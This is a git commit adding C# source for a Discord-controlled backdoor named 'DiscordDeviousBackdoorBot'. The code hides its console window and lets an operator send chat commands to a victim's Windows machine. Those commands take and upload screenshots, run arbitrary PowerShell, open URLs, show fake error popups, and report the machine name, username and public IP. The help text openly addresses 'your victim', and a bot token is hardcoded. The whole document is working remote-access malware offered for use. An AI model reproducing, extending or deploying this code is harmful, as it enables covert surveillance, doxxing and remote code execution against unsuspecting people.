e33288f4c9089a8a899862abb8970630c0905cb1
CoolPigeon69 <112344276+CoolPigeon69@users.noreply.github.com>
2022-08-28 11:48:57 -0700

    Add files via upload

---
+++ DiscordDeviousBackdoorBot/Program.cs
@@ -0,0 +1,109 @@
+﻿using Discord;
+using Discord.WebSocket;
+using System;
+using System.Threading.Tasks;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+
+
+//PUT IN YOUR DISCORD BOT TOKEN AT LINE 31  
+
+namespace DeviousBot
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
+
+        public static void Main(string[] args)
+        {
+            IntPtr GetConsoleWindow = Process.GetCurrentProcess().MainWindowHandle;
+            ShowWindow(GetConsoleWindow, 0);
+            new Program().MainAsync().GetAwaiter().GetResult();
+        }
+
+        private DiscordSocketClient _client;
+        public async Task MainAsync()
+        {
+            _client = new DiscordSocketClient();
+            _client.MessageReceived += CommandHandler;
+
+            var token = "MTAxMjQ2NjU5MjQ0MzAyMzM3MA.GPEd0f.Jyj8i8NLQ5taYYY8-ho7-D6OHvjri7ZeBH9O8Q"; // CHANGE TOKEN HERE
+
+            await _client.LoginAsync(TokenType.Bot, token);
+            await _client.StartAsync();
+
+            await Task.Delay(-1);
+        }
+
+        private Task CommandHandler(SocketMessage message)
+        {
+            //variables
+            string command = "";
+            int lengthOfCommand = -1;
+
+            //filter messages in here
+            if (!message.Content.StartsWith("!"))
+                return Task.CompletedTask;
+
+            if (message.Author.IsBot || message.Author.IsWebhook)
+                return Task.CompletedTask;
+
+            if (message.Content.Contains(" "))
+                lengthOfCommand = message.Content.IndexOf(" ");
+            else
+                lengthOfCommand = message.Content.Length;
+
+            command = message.Content.Substring(1, lengthOfCommand - 1).ToLower();
+
+            //Commands
+            if (command.Equals("hi"))
+            {
+                message.Channel.SendMessageAsync($@"Hello {message.Author.Mention}");
+            }
+            else if (command.Equals("help"))
+            {
+                message.Channel.SendMessageAsync($@"```here is a list of all the commands! :D
+--// commands on your victim \\--
+!ss ---- take a screenshot of your victim's screen
+!url (website url) ---- makes your victim go to your url, rickroll time!!
+!shell (powershell script) ---- opens up a powershell on your victim's computer and runs the code you put in ;)
+!message (what you wanna say to your victim) ---- makes a pop up message box on victim's computer
+!info ---- will tell you the victims machinename username and ip address```");
+            }
+            else if (command.Equals("ss"))
+            {
+                wirus.SpywareFunctions.takess();
+                message.Channel.SendFileAsync("ss.jpg");
+            }
+            else if (command.Equals(@"url"))
+            {
+                string website = message.Content.Substring(4);
+
+                message.Channel.SendMessageAsync("going right to the website!");
+                wirus.SpywareFunctions.urlFunc(website);
+            }
+            else if (command.Equals(@"shell"))
+            {
+                string shellScript = message.Content.Substring(6);
+                message.Channel.SendMessageAsync("sending the shell!");
+
+                wirus.SpywareFunctions.shellFunc(shellScript);
+            }
+            else if (command.Equals("message"))
+            {
+                string yourMessage = message.Content.Substring(8);
+                message.Channel.SendMessageAsync($@"{Environment.UserName} be getting trolled fr");
+                wirus.SpywareFunctions.messageFunc(yourMessage);
+            }
+            else if (command.Equals("info"))
+            {
+                message.Channel.SendMessageAsync($@"{Environment.MachineName} / {Environment.UserName} / {wirus.SpywareFunctions.getIp()}");
+                message.Channel.SendMessageAsync($@"man is getting doxxed lmao");
+            }
+
+            return Task.CompletedTask;
+        }
+
+    }
+}
---
+++ DiscordDeviousBackdoorBot/Wirus/SpywareFunctions.cs
@@ -0,0 +1,69 @@
+﻿using System;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.Media;
+using System.Net;
+using System.IO;
+using System.Runtime.InteropServices;
+
+namespace wirus
+{
+    public static class SpywareFunctions
+    {
+
+        [DllImport("User32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+        public static object takess()
+        {
+            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            Graphics graphics = Graphics.FromImage(bitmap as System.Drawing.Image);
+
+            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
+            bitmap.Save(@"ss.jpg", ImageFormat.Jpeg);
+
+            return bitmap;
+
+        }
+        
+        public static void urlFunc(string url)
+        {
+            var gettrolled = new ProcessStartInfo(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk");
+            gettrolled.Arguments = url.ToString();
+            Process.Start(gettrolled);
+        }
+
+        public static void shellFunc(string script)
+        {
+            var openShell = new ProcessStartInfo(@"Powershell.exe");
+            openShell.Arguments = script.ToString();
+            Process.Start(openShell);
+        }
+
+        public static void messageFunc(string message)
+        {
+            SystemSounds.Asterisk.Play();
+            MessageBox.Show(message, "Error");
+            SystemSounds.Exclamation.Play();
+        }
+
+        public static string getIp()
+        {
+            string Address = "";
+            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
+            using (WebResponse response = request.GetResponse())
+            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
+            {
+                Address = stream.ReadToEnd();
+            }
+            int first = Address.IndexOf("Address: ") + 9;
+            int last = Address.IndexOf("</body>");
+            Address = Address.Substring(first, last - first);
+
+            return Address.ToString();
+        }
+
+    }
+}
